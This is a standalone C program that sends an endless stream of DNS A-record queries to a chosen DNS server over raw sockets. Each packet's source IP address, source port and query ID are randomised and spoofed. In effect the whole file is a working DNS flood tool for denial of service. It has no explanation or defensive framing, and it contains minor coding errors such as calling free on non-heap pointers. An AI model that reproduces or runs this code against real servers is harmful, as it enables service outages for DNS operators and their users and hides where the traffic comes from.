#define _BSD_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/wait.h>
#include <getopt.h>

#define	  CLASS_INET 1

enum dns_type {
	TYPE_A = 1,
};

typedef struct type_name{
	uint16_t type;
	char typename[10];
} type_name_t;

type_name_t dns_type_names [] = {
	{TYPE_A, "A"},
};

#define DNS_TYPE_NUM (sizeof(dns_type_names) / sizeof(type_name_t))

struct dns_header {
	uint16_t id;

	uint8_t rd:1;				/* recursion desired */
	uint8_t tc:1;				/* truncated message */
	uint8_t aa:1;				/* authoritive answer */
	uint8_t opcode:4;			/* purpose of message */
	uint8_t qr:1;				/* response flag */

	uint8_t rcode:4;			/* response code */
	uint8_t unused:2;			/* unused bits */
	uint8_t pr:1;				/* primary server required (non standard) */
	uint8_t ra:1;				/* recursion available */

	uint16_t que_num;
	uint16_t rep_num;
	uint16_t num_rr;
	uint16_t num_rrsup;
};

void nameformat(char *name, char *QS){
	char *bungle, *x;
	char elem[128];

	*QS = 0;
	bungle = malloc(strlen(name) + 3);
	strcpy(bungle, name);
	x = strtok(bungle, ".");
	while (x != NULL) {
		if (snprintf(elem, 128, "%c%s", strlen(x), x) == 128) {
			puts("String overflow.");
			exit(1);
		}
		strcat(QS, elem);
		x = strtok(NULL, ".");
	}
	free(bungle);
	free(x);
}

int make_dns_question(uint8_t *data, uint8_t *name){
	nameformat(name, data);
	*((uint16_t *) (data + strlen(data) + 1)) = htons(TYPE_A);
	*((uint16_t *) (data + strlen(data) + 3)) = htons(CLASS_INET);
	return (strlen(data) + 5);
}

struct in_addr source_ip = {0};
struct sockaddr_in destination_socket = {0};
uint8_t domain_name[256] = {0};
uint16_t source_port;
uint16_t desstination_port = 53;
int socket_descriptor;
int spoofed_ip_addr = 1;
int stat_ip_addr;
uint8_t packet[2048] = {0};
struct ip *iphdr;
struct udphdr *udp_hdr;
struct dns_header *dns_hdr;
uint8_t *dns_data;
const uint32_t option_val_for_soclet = 1;

int main(int argc, char **argv){
	if (geteuid() != 0) {
		printf("Please run with sudo\n");
		return 1;
	}
	if(argc!=3){
		printf("Please run in format : %s domain.name (www.example.com), dns server address ( 192.168.168.4) \n",argv[0]);
		return 1;
	}
	srandom((uint32_t)time(NULL));
	strcpy(domain_name, argv[1]);
	inet_pton(AF_INET, argv[2], &destination_socket.sin_addr);

	if (!destination_socket.sin_addr.s_addr) {
		printf("Please run in format : %s domain.name (www.example.com), dns server address ( 192.168.168.4) \n",argv[0]);
		return 1;
	}

	if ((socket_descriptor = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
		printf("Creating socket failed\n");
		return 1;
	}

	if ((setsockopt(socket_descriptor, IPPROTO_IP, IP_HDRINCL, (char *) &option_val_for_soclet, sizeof(option_val_for_soclet)))== -1) {
		printf("Setting socket option failed\n");
		exit(-1);
	}

	destination_socket.sin_family = AF_INET;
	destination_socket.sin_port = htons(desstination_port);

	iphdr = (struct ip *)packet;
	udp_hdr = (struct udphdr *)((char *)iphdr + sizeof(struct ip));
	dns_hdr = (struct dns_header *)((char *)udp_hdr + sizeof(struct udphdr));
	dns_data = (char *)((char *)dns_hdr + sizeof(struct dns_header));

	// DNS header
	dns_hdr->rd = 1;
	dns_hdr->que_num = htons(1);
	dns_hdr->qr = 0;			/* qr = 0: question packet   */
	dns_hdr->aa = 0;			/* aa = 0: not auth answer   */
	dns_hdr->rep_num = htons(0);	/* sending no replies        */

	// UDP header 
	udp_hdr->uh_dport = htons(desstination_port);

	// IP header 
	iphdr->ip_dst.s_addr = destination_socket.sin_addr.s_addr;
	iphdr->ip_v = IPVERSION;
	iphdr->ip_hl = sizeof(struct ip) >> 2;
	iphdr->ip_ttl = 255;
	iphdr->ip_p = IPPROTO_UDP;

    int cnttt = 0;

	while (1) {
		uint32_t dns_datalen;
		uint32_t udp_datalen;
		uint32_t ip_datalen;

		ssize_t ret;

		if (spoofed_ip_addr) {
			source_ip.s_addr = random();
		}

		dns_hdr->id = random();
		dns_datalen = make_dns_question(dns_data, domain_name);

		udp_datalen = sizeof(struct dns_header) + dns_datalen;
		ip_datalen = sizeof(struct udphdr) + udp_datalen;

		/* update UDP header*/
		if (source_port == 0) {
			udp_hdr->uh_sport = htons(random() % 65535);
		}
		udp_hdr->uh_ulen = htons(sizeof(struct udphdr) + udp_datalen);
		udp_hdr->uh_sum = 0;

		/* update IP header */
		iphdr->ip_src.s_addr = source_ip.s_addr;
		iphdr->ip_id = ((uint16_t)random());
		iphdr->ip_len = sizeof(struct ip) + ip_datalen;
		iphdr->ip_sum = 0;
		ret = sendto(socket_descriptor, iphdr, sizeof(struct ip) + ip_datalen, 0,(struct sockaddr *) &destination_socket, sizeof(struct sockaddr));
		if (ret == -1) {
			printf("Sending query to DNS Server failed.\n");
		}
	}

	free(iphdr);
	free(udp_hdr);
	free(dns_hdr);
	return 0;
}
